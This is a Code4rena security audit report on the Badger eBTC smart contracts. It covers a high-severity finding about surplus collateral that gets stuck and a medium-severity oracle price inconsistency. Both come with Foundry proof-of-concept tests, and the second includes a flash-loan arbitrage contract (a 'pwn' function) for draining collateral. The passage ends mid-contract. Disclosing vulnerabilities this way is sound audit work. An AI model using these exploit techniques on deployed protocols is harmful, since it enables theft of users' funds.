---
sponsor: "eBTC Protocol"
slug: "2023-10-badger"
date: "2024-02-13"
title: "Badger eBTC Audit + Certora Formal Verification Competition"
findings: "https://github.com/code-423n4/2023-10-badger-findings/issues"
contest: 300
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Badger eBTC smart contract system written in Solidity. The audit took place between October 24—November 14 2023.

Alongside the C4 audit, a formal verification competition was held in partnership with Certora. The summary of the [formal verification competition](#formal-verification-competition) is appended below the audit report.

## Wardens

95 Wardens contributed reports to the Badger eBTC Audit + Certora Formal Verification Competition:

  1. [Stormy](https://code4rena.com/@Stormy)
  2. [TrungOre](https://code4rena.com/@TrungOre)
  3. [0xBeirao](https://code4rena.com/@0xBeirao)
  4. [ether\_sky](https://code4rena.com/@ether_sky)
  5. [shaka](https://code4rena.com/@shaka)
  6. [0xRobocop](https://code4rena.com/@0xRobocop)
  7. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  8. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  9. [Nyx](https://code4rena.com/@Nyx)
  10. [nobody2018](https://code4rena.com/@nobody2018)
  11. [BARW](https://code4rena.com/@BARW) ([BenRai](https://code4rena.com/@BenRai) and [albertwh1te](https://code4rena.com/@albertwh1te))
  12. [DavidGiladi](https://code4rena.com/@DavidGiladi)
  13. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  14. [hihen](https://code4rena.com/@hihen)
  15. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  16. [zabihullahazadzoi](https://code4rena.com/@zabihullahazadzoi)
  17. [unique](https://code4rena.com/@unique)
  18. [JCK](https://code4rena.com/@JCK)
  19. [Sathish9098](https://code4rena.com/@Sathish9098)
  20. [Madalad](https://code4rena.com/@Madalad)
  21. [codeslide](https://code4rena.com/@codeslide)
  22. [oualidpro](https://code4rena.com/@oualidpro)
  23. [lsaudit](https://code4rena.com/@lsaudit)
  24. [ge6a](https://code4rena.com/@ge6a)
  25. [prapandey031](https://code4rena.com/@prapandey031)
  26. [ladboy233](https://code4rena.com/@ladboy233)
  27. [peanuts](https://code4rena.com/@peanuts)
  28. [LokiThe5th](https://code4rena.com/@LokiThe5th)
  29. [OMEN](https://code4rena.com/@OMEN)
  30. [jasonxiale](https://code4rena.com/@jasonxiale)
  31. [wangxx2026](https://code4rena.com/@wangxx2026)
  32. [alpha](https://code4rena.com/@alpha)
  33. [nonseodion](https://code4rena.com/@nonseodion)
  34. [SY\_S](https://code4rena.com/@SY_S)
  35. [petrichor](https://code4rena.com/@petrichor)
  36. [sivanesh\_808](https://code4rena.com/@sivanesh_808)
  37. [0xhex](https://code4rena.com/@0xhex)
  38. [tala7985](https://code4rena.com/@tala7985)
  39. [mgf15](https://code4rena.com/@mgf15)
  40. [0xta](https://code4rena.com/@0xta)
  41. [SAQ](https://code4rena.com/@SAQ)
  42. [jamshed](https://code4rena.com/@jamshed)
  43. [Collinsoden](https://code4rena.com/@Collinsoden)
  44. [ybansal2403](https://code4rena.com/@ybansal2403)
  45. [alexzoid](https://code4rena.com/@alexzoid)
  46. [7ashraf](https://code4rena.com/@7ashraf)
  47. [twicek](https://code4rena.com/@twicek)
  48. [twcctop](https://code4rena.com/@twcctop)
  49. [niroh](https://code4rena.com/@niroh)
  50. [bdmcbri](https://code4rena.com/@bdmcbri)
  51. [fatherOfBlocks](https://code4rena.com/@fatherOfBlocks)
  52. [0x00ffDa](https://code4rena.com/@0x00ffDa)
  53. [0xlemon](https://code4rena.com/@0xlemon)
  54. [0xvj](https://code4rena.com/@0xvj)
  55. [3docSec](https://code4rena.com/@3docSec)
  56. [Arion](https://code4rena.com/@Arion)
  57. [BAHOZ](https://code4rena.com/@BAHOZ)
  58. [bharg4v](https://code4rena.com/@bharg4v)
  59. [Bolby](https://code4rena.com/@Bolby)
  60. [brgltd](https://code4rena.com/@brgltd)
  61. [capriza](https://code4rena.com/@capriza)
  62. [chrollophantom](https://code4rena.com/@chrollophantom)
  63. [DarkTower](https://code4rena.com/@DarkTower) ([Gelato\_ST](https://code4rena.com/@Gelato_ST), [OxTenma](https://code4rena.com/@OxTenma), [0xrex](https://code4rena.com/@0xrex), and [Maroutis](https://code4rena.com/@Maroutis))
  64. [deadbee](https://code4rena.com/@deadbee)
  65. [degensec](https://code4rena.com/@degensec)
  66. [desaperh](https://code4rena.com/@desaperh)
  67. [dirtymic](https://code4rena.com/@dirtymic)
  68. [etherhood](https://code4rena.com/@etherhood)
  69. [imare](https://code4rena.com/@imare)
  70. [invitedtea](https://code4rena.com/@invitedtea)
  71. [jessicapointing](https://code4rena.com/@jessicapointing)
  72. [Junnon](https://code4rena.com/@Junnon)
  73. [kento](https://code4rena.com/@kento)
  74. [Kirkeelee](https://code4rena.com/@Kirkeelee)
  75. [linuslandin](https://code4rena.com/@linuslandin)
  76. [naszam](https://code4rena.com/@naszam)
  77. [neumo](https://code4rena.com/@neumo)
  78. [nican0r](https://code4rena.com/@nican0r)
  79. [Nikki](https://code4rena.com/@Nikki)
  80. [peritoflores](https://code4rena.com/@peritoflores)
  81. [polarzero](https://code4rena.com/@polarzero)
  82. [PPrieditis](https://code4rena.com/@PPrieditis)
  83. [sashik\_eth](https://code4rena.com/@sashik_eth)
  84. [saul](https://code4rena.com/@saul)
  85. [Testerbot](https://code4rena.com/@Testerbot)
  86. [VicenteM](https://code4rena.com/@VicenteM)
  87. [vipe0x](https://code4rena.com/@vipe0x)
  88. [vittdav](https://code4rena.com/@vittdav)
  89. [yjrwkk](https://code4rena.com/@yjrwkk)
  90. [yojeff](https://code4rena.com/@yojeff)
  91. [zapaz](https://code4rena.com/@zapaz)

This audit was judged by [ronnyx2017](https://code4rena.com/@ronnyx2017).

Final report assembled by PaperParachute and [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 7 unique vulnerabilities. Of these vulnerabilities, 1 received a risk rating in the category of HIGH severity and 6 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 26 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 24 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Badger eBTC repository](https://github.com/code-423n4/2023-10-badger), and is composed of 39 smart contracts written in the Solidity programming language and includes 5714 lines of Solidity code.

In addition to the known issues identified by the project team, an [Automated Findings report](https://github.com/code-423n4/2023-10-badger/blob/main/4naly3er-report.md) was generated using the [4naly3er bot](https://github.com/Picodes/4naly3er) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (1)
## [[H-01] Loss of user funds, as LeverageMacroReferences can't do an arbitrary system call to the function claimsSurplusCollShare in order to claim the extra surplus collateral gained from their liquidated or fully redeemed Cdps](https://github.com/code-423n4/2023-10-badger-findings/issues/323)
*Submitted by [Stormy](https://github.com/code-423n4/2023-10-badger-findings/issues/323), also found by [SpicyMeatball](https://github.com/code-423n4/2023-10-badger-findings/issues/69)*

On a short explanation, leverage macros are contracts specifically made to interact with the eBTC system, with a leverage macro you can:

*   Open, adjust and close Cdps
*   Take eBTC, stETH flashloans
*   Make swaps in DEXes
*   Do arbitrary calls

Everyone is free to make a call to one of the functions in LeverageMacroFactory and deploy a new copy of the reference implementation of LeverageMacro for self use.

```solidity
    /// @notice Deploys a new macro for you
    function deployNewMacro() external returns (address) {
        return deployNewMacro(msg.sender);
    }
```

```solidity
    /// @notice Deploys a new macro for an owner, only they can operate the macro
    function deployNewMacro(address _owner) public returns (address) {
        address addy = address(
            new LeverageMacroReference(
                borrowerOperations,
                activePool,
                cdpManager,
                ebtcToken,
                stETH,
                sortedCdps,
                _owner
            )
        );

        emit DeployNewMacro(_owner, addy);

        return addy;
    }
```

While having an opened Cdp position, there is always a chance for your position to be fully redeemed or liquidated. In this two cases there will always be a surplus collateral left to the owner of the Cdp when:

*   A Cdp with ICR >= MCR is fully redeemed.
*   A Cdp with ICR > MCR is fully liquidated in recovery mode.

Any surplus collateral is send to the CollSurplusPool, which can later be claimed by the owner of the Cdp. The only way for an owner to claim his surplus collateral is to call the function claimSurplusCollShares in borrowerOperations, which is the only entry point to the CollSurplusPool.

```solidity
    /// @notice Claim remaining collateral from a redemption or from a liquidation with ICR > MCR in Recovery Mode
    /// @notice when a Cdp has been fully redeemed from and closed, or liquidated in Recovery Mode with a collateralization ratio higher enough (like over MCR)
    /// @notice the borrower is allowed to claim their stETH collateral surplus that remains in the system if any
    function claimSurplusCollShares() external override {
        // send ETH from CollSurplus Pool to owner
        collSurplusPool.claimSurplusCollShares(msg.sender);
    }
```

The problem here is that LeverageMacroReferences don't have build in feature to claim the surplus collateral from its fully redeemed or liquidated Cdps. In this case the only way for LeverageMacroReference to claim the surplus collateral is to make an arbitrary call to the function claimSurplusCollShares in borrowerOperations. However this isn't possible as the LeverageMacroReference ensures there aren't any arbitrary calls made to the system contracts.

As we can see In \_doSwap the first thing the function does, is to call the internal function \_ensureNotSystem which ensures that the arbitraty call isn't made to any of the system contracts. Duo to that the function \_doSwap will revert when a LeverageMacroReference tries to make an arbitrary call to borrowerOperations.

```solidity
    /// @dev Prevents doing arbitrary calls to protected targets
    function _ensureNotSystem(address addy) internal {
        /// @audit Check and add more if you think it's better
        require(addy != address(borrowerOperations));
        require(addy != address(sortedCdps));
        require(addy != address(activePool));
        require(addy != address(cdpManager));
        require(addy != address(this)); // If it could call this it could fake the forwarded caller
    }
```

```solidity
    function _doSwap(SwapOperation memory swapData) internal {
        // Ensure call is safe
        // Block all system contracts
        _ensureNotSystem(swapData.addressForSwap);

        // Exact approve
        // Approve can be given anywhere because this is a router, and after call we will delete all approvals
        IERC20(swapData.tokenForSwap).safeApprove(
            swapData.addressForApprove,
            swapData.exactApproveAmount
        );

        // Call and perform swap
        // NOTE: Technically approval may be different from target, something to keep in mind
        // Call target are limited
        // But technically you could approve w/e you want here, this is fine because the contract is a router and will not hold user funds
        (bool success, ) = excessivelySafeCall(
            swapData.addressForSwap,
            gasleft(),
            0,
            0,
            swapData.calldataForSwap
        );
        require(success, "Call has failed");

        // Approve back to 0
        // Enforce exact approval
        // Can use max because the tokens are OZ
        // val -> 0 -> 0 -> val means this is safe to repeat since even if full approve is unused, we always go back to 0 after
        IERC20(swapData.tokenForSwap).safeApprove(swapData.addressForApprove, 0);

        // Do the balance checks after the call to the aggregator
        _doSwapChecks(swapData.swapChecks);
    }
```

Since there is no built in feature to claim the surplus collateral and LeverageMacroReference can't make an arbitrary call to borrowerOperations. Any surplus collateral owned by LeverageMacroReference can't be further claimed back and will be permanently stuck in CollSurplusPool.

### Proof of Concept

    POC steps in the function testLeverageIssue:
    - Step 1: Get the macro's owner and check if the owner is the wallet address.
    - Step 2: Get data for the function doOperation.
    - Step 3: Approve leverage with the Cdps's collateral + liquidator rewards.
    - Step 4: Call the function doOperation twice and open two Cdps.
    - Step 5: Check one of the Cdps was opened && the macro address is the Cdp owner.
    - Step 6: The macro reference always sweeps back to the wallet, but make sure that happens.
    - Step 7: Redeem fully back one of the Cdps to gain a surplus collateral in the surplus pool.
    - Step 8: Make sure the Cdp was fully redeemed.
    - Step 9: Check that the macro received surplus collateral from the redeeming.
    - Step 10: Preparing data for the swap and the arbitrary call.
    - Step 11: Do arbitrary call to the function claimSurplusCollShares in borrowerOperations.
    - Final: Expect revert as the leverage macro can't make arbitrary calls to the system contracts.

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import {SimplifiedDiamondLike} from "../contracts/SimplifiedDiamondLike.sol";

import {eBTCBaseInvariants} from "./BaseInvariants.sol";
import {LeverageMacroReference} from "../contracts/LeverageMacroReference.sol";
import {LeverageMacroBase} from "../contracts/LeverageMacroBase.sol";
import {ICdpManagerData} from "../contracts/Interfaces/ICdpManagerData.sol";

contract LeverageMacroReferenceIssue is eBTCBaseInvariants {

    address wallet = address(0xbad455);

    LeverageMacroReference macro_reference;
    LeverageMacroBase macro_base;

    function setUp() public override {
        super.setUp();

        connectCoreContracts();
        connectLQTYContractsToCore();

        // straight creating new macro reference for the test
        macro_reference = new LeverageMacroReference(
            address(borrowerOperations),
            address(activePool),
            address(cdpManager),
            address(eBTCToken),
            address(collateral),
            address(sortedCdps),
            wallet
        );

        dealCollateral(wallet, 100e18);
    }

    function testLeverageIssue() public {

        vm.startPrank(wallet);

        // Step 1: Get the macro's owner and check if the owner is the wallet address
        address macroOwner = macro_reference.owner();
        assert(wallet == macroOwner);

        // Step 2: Get data for the function doOperation
        LeverageMacroBase.SwapOperation[] memory _levSwapsBefore;
        LeverageMacroBase.SwapOperation[] memory _levSwapsAfter;

        uint256 netColl = 11e18;

        uint256 grossColl = netColl + cdpManager.LIQUIDATOR_REWARD();

        uint256 debt = _utils.calculateBorrowAmount(
            netColl,
            priceFeedMock.fetchPrice(),
            COLLATERAL_RATIO
        );

        LeverageMacroBase.OpenCdpOperation memory _opData = LeverageMacroBase.OpenCdpOperation(
            debt,
            bytes32(0),
            bytes32(0),
            grossColl
        );

        bytes memory _opDataEncoded = abi.encode(_opData);

        LeverageMacroBase.LeverageMacroOperation memory operation = LeverageMacroBase
            .LeverageMacroOperation(
                address(collateral),
                (grossColl - 0),
                _levSwapsBefore,
                _levSwapsAfter,
                LeverageMacroBase.OperationType.OpenCdpOperation,
                _opDataEncoded
            );

        LeverageMacroBase.PostCheckParams memory postCheckParams = LeverageMacroBase
            .PostCheckParams({
                expectedDebt: LeverageMacroBase.CheckValueAndType({
                    value: 0,
                    operator: LeverageMacroBase.Operator.skip
                }),
                expectedCollateral: LeverageMacroBase.CheckValueAndType({
                    value: 0,
                    operator: LeverageMacroBase.Operator.skip
                }),
                cdpId: bytes32(0),
                expectedStatus: ICdpManagerData.Status.active
            });

        // Step 3: Approve leverage with the Cdps's collateral + liquidator rewards.
        collateral.approve(address(macro_reference), 22e18 + 4e17);

        // Step 4: Call the function doOperation twice and open two Cdps
        // Need more than one Cdp in the system to fully redeem a Cdp.
        macro_reference.doOperation(
                    LeverageMacroBase.FlashLoanType.noFlashloan,
                    0,
                    operation,
                    LeverageMacroBase.PostOperationCheck.openCdp,
                    postCheckParams
                );

        macro_reference.doOperation(
                    LeverageMacroBase.FlashLoanType.noFlashloan,
                    0,
                    operation,
                    LeverageMacroBase.PostOperationCheck.openCdp,
                    postCheckParams
                );

        // Step 5: Check one of the Cdps was opened && the macro address is the Cdp owner
        bytes32 cdpId = sortedCdps.cdpOfOwnerByIndex(address(macro_reference), 0);
        address cdpOwner = sortedCdps.getOwnerAddress(cdpId);
        assert(address(macro_reference) == cdpOwner);

        // Step 6: The macro reference always sweeps back to the wallet, but make sure that happens
        uint256 balance = eBTCToken.balanceOf(wallet);
        assert(balance == (debt * 2)); // The debt of the 2 Cdps opened

        // Step 7: Redeem fully back one of the Cdps to gain a surplus collateral in the surplus pool
        cdpManager.redeemCollateral(debt, cdpId, bytes32(0), bytes32(0), 0, 0, 1e18);

        // Step 8: Make sure the Cdp was fully redeemed
        bool redeemed = sortedCdps.contains(cdpId); // False means its not in the list == redeemed
        assert(redeemed == false);

        // Step 9: Check that the macro received surplus collateral from the redeeming
        uint256 surplusColl = collSurplusPool.getSurplusCollShares(address(macro_reference));
        assert(surplusColl > 0);

        // Step 10: Preparing data for the swap and the arbitrary call.
        LeverageMacroBase.SwapCheck[] memory _swapChecks = new LeverageMacroBase.SwapCheck[](1);
        _swapChecks[0] = LeverageMacroBase.SwapCheck(address(0), 0); // empty

        LeverageMacroBase.SwapOperation memory swap = LeverageMacroBase.SwapOperation(
            address(0),
            address(0),
            0,
            address(borrowerOperations),
            abi.encodeCall(borrowerOperations.claimSurplusCollShares, ()),
            _swapChecks
        );

        // Step 11: Do arbitrary call to the function claimSurplusCollShares in borrowerOperations
        // Expect revert as the macro ensures there aren't calls to the system contracts
        // Macro isn't able to call borrowerOperations, check the function _ensureNotSystem.
        vm.expectRevert();
        _doSwap(swap);

        vm.stopPrank();
    }

    // Removing everything else expect the _ensureNotSystem and the excessivelySafeCall function
    // (don't need the other parts for the issue showcase)
    function _doSwap(LeverageMacroBase.SwapOperation memory swapData) internal {
        // Ensure call is safe
        // Block all system contracts
        _ensureNotSystem(swapData.addressForSwap);

        // Call and perform swap
        // NOTE: Technically approval may be different from target, something to keep in mind
        // Call target are limited
        // But technically you could approve w/e you want here, this is fine because the contract is a router and will not hold user funds
        (bool success, ) = excessivelySafeCall(
            swapData.addressForSwap,
            gasleft(),
            0,
            0,
            swapData.calldataForSwap
        );
        require(success, "Call has failed");
    }

    function excessivelySafeCall(
        address _target,
        uint256 _gas,
        uint256 _value,
        uint16 _maxCopy,
        bytes memory _calldata
    ) internal returns (bool, bytes memory) {
        // set up for assembly call
        uint256 _toCopy;
        bool _success;
        bytes memory _returnData = new bytes(_maxCopy);
        // dispatch message to recipient
        // by assembly calling "handle" function
        // we call via assembly to avoid memcopying a very large returndata
        // returned by a malicious contract
        assembly {
            _success := call(
                _gas, // gas
                _target, // recipient
                _value, // ether value
                add(_calldata, 0x20), // inloc
                mload(_calldata), // inlen
                0, // outloc
                0 // outlen
            )
            // limit our copy to 256 bytes
            _toCopy := returndatasize()
            if gt(_toCopy, _maxCopy) {
                _toCopy := _maxCopy
            }
            // Store the length of the copied bytes
            mstore(_returnData, _toCopy)
            // copy the bytes from returndata[0:_toCopy]
            returndatacopy(add(_returnData, 0x20), 0, _toCopy)
        }
        return (_success, _returnData);
    }

        /// @dev Prevents doing arbitrary calls to protected targets
    function _ensureNotSystem(address addy) internal {
        require(addy != address(borrowerOperations));
        require(addy != address(sortedCdps));
        require(addy != address(activePool));
        require(addy != address(cdpManager));
        require(addy != address(this));
    }
}
```

</details>

### Recommended Mitigation Steps

Allowing LeverageMacroReference to do an arbitrary call to one of the system contracts brings bigger risk. So I would say the best recommendation is to build a feature for the LeverageMacroReference to do a claim surplus operation in order to claim its surplus collateral from CollSurplusPool:

*   Adjust the enum to have a claim surplus operations as well

```solidity
    enum OperationType {
        OpenCdpOperation,
        AdjustCdpOperation,
        CloseCdpOperation,
+       ClaimSurplusOperation 
    }
```

*   Add a new else if statement which is triggered when the operation is ClaimSurplusOperation, in the statement the new internal function \_claimSurplusCallback is called.

```solidity
    function _handleOperation(LeverageMacroOperation memory operation) internal {
        uint256 beforeSwapsLength = operation.swapsBefore.length;
        if (beforeSwapsLength > 0) {
            _doSwaps(operation.swapsBefore);
        }

        // Based on the type we do stuff
        if (operation.operationType == OperationType.OpenCdpOperation) {
            _openCdpCallback(operation.OperationData);
        } else if (operation.operationType == OperationType.CloseCdpOperation) {
            _closeCdpCallback(operation.OperationData);
        } else if (operation.operationType == OperationType.AdjustCdpOperation) {
            _adjustCdpCallback(operation.OperationData);
+       } else if (operation.operationType == OperationType.ClaimSurplusOperation {
           _claimSurplusCallback();
        }

        uint256 afterSwapsLength = operation.swapsAfter.length;
        if (afterSwapsLength > 0) {
            _doSwaps(operation.swapsAfter);
        }
    }
```

*   Create the new internal function \_claimSurplusCallback, which makes a call to the function claimSurplusCollShares in borrowerOperations and claims the leverage macro's surplus collateral from CollSurplusPool.

```solidity
+   function _claimSurplusCallback() internal {
+       borrowerOperations.claimSurplusCollShares();
+   }
```

*   After the recommendation LeverageMacroReferences are able to claim the surplus collateral of their fully redeemed or liquidated Cdps and everyone should be happy.

**[Alex the Entreprenerd (Badger) confirmed and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/323#issuecomment-1818666837):**
 > The finding is valid in that you cannot claim the surplus.

 > You could argue it requires being redeemed or liquidated, but I don't think that can be considered an external requirement since it's a normal behaviour.

**[ronnyx2017 (Judge) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/323#issuecomment-1827410005):**
 > Meet high: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).

***
 
# Medium Risk Findings (6)
## [[M-01] `fetchPrice` can return different prices in the same transaction](https://github.com/code-423n4/2023-10-badger-findings/issues/310)
*Submitted by [shaka](https://github.com/code-423n4/2023-10-badger-findings/issues/310), also found by [ether\_sky](https://github.com/code-423n4/2023-10-badger-findings/issues/256)*

<https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/PriceFeed.sol#L341> 

<https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/PriceFeed.sol#L231>

`PriceFeed.sol:fetchPrice()` can return different prices in the same transaction when Chainlink price changes over 50% and the fallback oracle is not set.

In the scenario of the fallback oracle not set and the Chainlink oracle working correctly the status is `usingChainlinkFallbackUntrusted`. If the Chainlink price changes over 50%, the condition of line 340 evaluates to true, so the last good price is returned and the status is set to `bothOraclesUntrusted`.

```solidity
313        // --- CASE 5: Using Chainlink, Fallback is untrusted ---
314        if (status == Status.usingChainlinkFallbackUntrusted) {
    (...)
340            if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {
341                _changeStatus(Status.bothOraclesUntrusted);
342                return lastGoodPrice;
343            }
```

However, if the price is requested again and the Chainlink price still returns a price change over 50% from the previous round, having the status set to `bothOraclesUntrusted` will cause the condition of line 220 to evaluate to true and, given that the fallback oracle is not set and the Chainlink oracle is neither broken nor frozen, the price returned will be the current Chainlink price.

```solidity
219        // --- CASE 3: Both oracles were untrusted at the last price fetch ---
220        if (status == Status.bothOraclesUntrusted) {
221            /*
222             * If there's no fallback, only use Chainlink
223             */
224            if (address(fallbackCaller) == address(0)) {
225                // If CL has resumed working
226                if (
227                    !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&
228                    !_chainlinkIsFrozen(chainlinkResponse)
229                ) {
230                    _changeStatus(Status.usingChainlinkFallbackUntrusted);
231                    return _storeChainlinkPrice(chainlinkResponse.answer);
232                }
233            }
```

### Impact

A difference in the price returned by `fetchPrice` in the same transaction can be exploited to perform an arbitrage in different ways.

In the case of an increase of over 50% in the Chainlink price, a user can redeem a CDP with the last good price and then open a new CDP with the current Chainlink price, obtaining a collateral surplus.

In the case of a decrease over 50%, a user can open a CDP with the last good price and then redeem it with the current Chainlink price, obtaining a collateral surplus.

In both cases, the collateral surplus is obtained at the expense of the protocol with no risk for the user.

### Proof of Concept

<details>

<summary>PoC 1</summary>

This PoC shows that `fetchPrice` can return different prices in the same transaction when the Chainlink price changes over 50% and the fallback oracle is not set.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import {IPriceFeed} from "../contracts/Interfaces/IPriceFeed.sol";
import {PriceFeed} from "../contracts/PriceFeed.sol";
import {PriceFeedTester} from "../contracts/TestContracts/PriceFeedTester.sol";
import {MockTellor} from "../contracts/TestContracts/MockTellor.sol";
import {MockAggregator} from "../contracts/TestContracts/MockAggregator.sol";
import {eBTCBaseFixture} from "./BaseFixture.sol";
import {TellorCaller} from "../contracts/Dependencies/TellorCaller.sol";
import {AggregatorV3Interface} from "../contracts/Dependencies/AggregatorV3Interface.sol";

contract AuditPriceFeedTest is eBTCBaseFixture {
    address constant STETH_ETH_CL_FEED = 0x86392dC19c0b719886221c78AB11eb8Cf5c52812;

    PriceFeedTester internal priceFeedTester;
    MockAggregator internal _mockChainLinkEthBTC;
    MockAggregator internal _mockChainLinkStEthETH;
    uint80 internal latestRoundId = 321;
    int256 internal initEthBTCPrice = 7428000;
    int256 internal initStEthETHPrice = 9999e14;
    uint256 internal initStEthBTCPrice = 7428e13;
    address internal authUser;

    function setUp() public override {
        eBTCBaseFixture.setUp();
        eBTCBaseFixture.connectCoreContracts();
        eBTCBaseFixture.connectLQTYContractsToCore();

        // Set current and prev price
        _mockChainLinkEthBTC = new MockAggregator();
        _initMockChainLinkFeed(_mockChainLinkEthBTC, latestRoundId, initEthBTCPrice, 8);
        _mockChainLinkStEthETH = new MockAggregator();
        _initMockChainLinkFeed(_mockChainLinkStEthETH, latestRoundId, initStEthETHPrice, 18);

        priceFeedTester = new PriceFeedTester(
            address(0), // fallback oracle not set
            address(authority),
            address(_mockChainLinkStEthETH),
            address(_mockChainLinkEthBTC)
        );
        priceFeedTester.setStatus(IPriceFeed.Status.usingChainlinkFallbackUntrusted);

        // Grant permission on price feed
        authUser = _utils.getNextUserAddress();
        vm.startPrank(defaultGovernance);
        authority.setUserRole(authUser, 4, true);
        authority.setRoleCapability(4, address(priceFeedTester), SET_FALLBACK_CALLER_SIG, true);
        vm.stopPrank();
    }

    function _initMockChainLinkFeed(
        MockAggregator _mockFeed,
        uint80 _latestRoundId,
        int256 _price,
        uint8 _decimal
    ) internal {
        _mockFeed.setLatestRoundId(_latestRoundId);
        _mockFeed.setPrevRoundId(_latestRoundId - 1);
        _mockFeed.setPrice(_price);
        _mockFeed.setPrevPrice(_price);
        _mockFeed.setDecimals(_decimal);
        _mockFeed.setUpdateTime(block.timestamp);
    }

    function testPriceChangeOver50PerCent() public {
        uint256 lastGoodPrice = priceFeedTester.lastGoodPrice();

        // Price change over 50%
        int256 newEthBTCPrice = (initEthBTCPrice * 2) + 1;
        _mockChainLinkEthBTC.setPrice(newEthBTCPrice);

        // Get price
        uint256 newPrice = priceFeedTester.fetchPrice();
        IPriceFeed.Status status = priceFeedTester.status();
        assertEq(newPrice, lastGoodPrice); // last good price is used
        assertEq(uint256(status), 2); // bothOraclesUntrusted
        
        // Get price again in the same block (no changes in ChainLink price)
        newPrice = priceFeedTester.fetchPrice();
        status = priceFeedTester.status();
        assertGt(newPrice, lastGoodPrice * 2); // current ChainLink price is used
        assertEq(uint256(status), 4); // usingChainlinkFallbackUntrusted
    }
}
```

</details>

<details>

<summary>PoC 2</summary>

This PoC shows how to exploit the vulnerability to perform an arbitrage.

`PriceFeedTestnet.sol` has been edited to simulate the scenario proved in the previous test, where the first call to `fetchPrice` returns the last good price and the second call returns the current Chainlink price.

```diff
@@ -44,6 +44,12 @@ contract PriceFeedTestnet is IPriceFeed, Ownable, AuthNoOwner {
         return _price;
     }
 
+    bool private isFirstCall = true;
+
+    function setIsFirstCall(bool _isFirstCall) external {
+        isFirstCall = _isFirstCall;
+    }
+
     function fetchPrice() external override returns (uint256) {
         // Fire an event just like the mainnet version would.
         // This lets the subgraph rely on events to get the latest price even when developing locally.
@@ -53,8 +59,13 @@ contract PriceFeedTestnet is IPriceFeed, Ownable, AuthNoOwner {
                 _price = fallbackResponse.answer;
             }
         }
-        emit LastGoodPriceUpdated(_price);
-        return _price;
+
+        if (isFirstCall) {
+            isFirstCall = false;
+            return _price;
+        } else {
+            return _price * 2 + 1;
+        }
     }
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import {eBTCBaseFixture} from "./BaseFixture.sol";
import {IERC20} from "../contracts/Dependencies/IERC20.sol";
import {IERC3156FlashLender} from "../contracts/Interfaces/IERC3156FlashLender.sol";
import {IBorrowerOperations} from "../contracts/Interfaces/IBorrowerOperations.sol";
import {IERC3156FlashBorrower} from "../contracts/Interfaces/IERC3156FlashBorrower.sol";
import {ICdpManager} from "../contracts/Interfaces/ICdpManager.sol";
import {HintHelpers} from "../contracts/HintHelpers.sol";

contract AuditArbitrageTest is eBTCBaseFixture {
    FlashLoanBorrower internal flashBorrower;
    uint256 internal initialPrice;

    function setUp() public override {
        eBTCBaseFixture.setUp();
        eBTCBaseFixture.connectCoreContracts();
        eBTCBaseFixture.connectLQTYContractsToCore();

        // Create a CDP to have collateral in the protocol
        initialPrice = priceFeedMock.getPrice();
        uint256 _coll = 1_000e18;
        uint256 _debt = (_coll * initialPrice) / 200e16;
        dealCollateral(address(this), _coll + cdpManager.LIQUIDATOR_REWARD());
        collateral.approve(address(borrowerOperations), type(uint256).max);
        borrowerOperations.openCdp(_debt, bytes32(0), bytes32(0), _coll + cdpManager.LIQUIDATOR_REWARD());
        // Reset `isFirstCall` to true, as `fetchPrice` is called on `openCdp`
        priceFeedMock.setIsFirstCall(true);

        // Create flash loan borrower
        flashBorrower = new FlashLoanBorrower(
            address(collateral),
            address(eBTCToken),
            address(borrowerOperations),
            address(cdpManager),
            address(hintHelpers)
        );
    }

    function testArbitragePriceChangeOver50PerCent() public {
        assertEq(collateral.balanceOf(address(flashBorrower)), 0);
        assertEq(eBTCToken.balanceOf(address(flashBorrower)), 0);
        assertEq(activePool.getSystemCollShares(), 1_000e18);

        uint256 eBTCBborrowAmount = 10e18;
        flashBorrower.pwn(eBTCBborrowAmount, initialPrice);

        uint256 minExpectedCollProfit = 40e18;
        assertGt(collateral.balanceOf(address(flashBorrower)), minExpectedCollProfit);
        assertLt(collateral.balanceOf(address(flashBorrower)), 1_000e18 - minExpectedCollProfit);
    }
}

contract FlashLoanBorrower {
    IERC20 public immutable collateral;
    IERC20 public immutable eBTCToken;
    IBorrowerOperations public immutable borrowerOperations;
    ICdpManager public immutable cdpManager;
    HintHelpers public immutable hintHelpers;

    constructor(
        address _collateral,
        address _eBTCToken,
        address _borrowerOperations,
        address _cdpManager,
        address _hintHelpers
    ) {
        collateral = IERC20(_collateral);
        eBTCToken = IERC20(_eBTCToken);
